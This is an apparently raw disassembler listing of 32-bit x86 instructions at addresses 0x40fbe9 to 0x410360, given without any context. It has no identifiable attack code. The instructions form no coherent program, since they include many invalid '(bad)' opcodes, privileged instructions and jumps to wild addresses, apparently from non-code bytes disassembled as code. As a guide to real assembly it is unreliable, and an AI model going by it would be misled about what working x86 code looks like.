  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
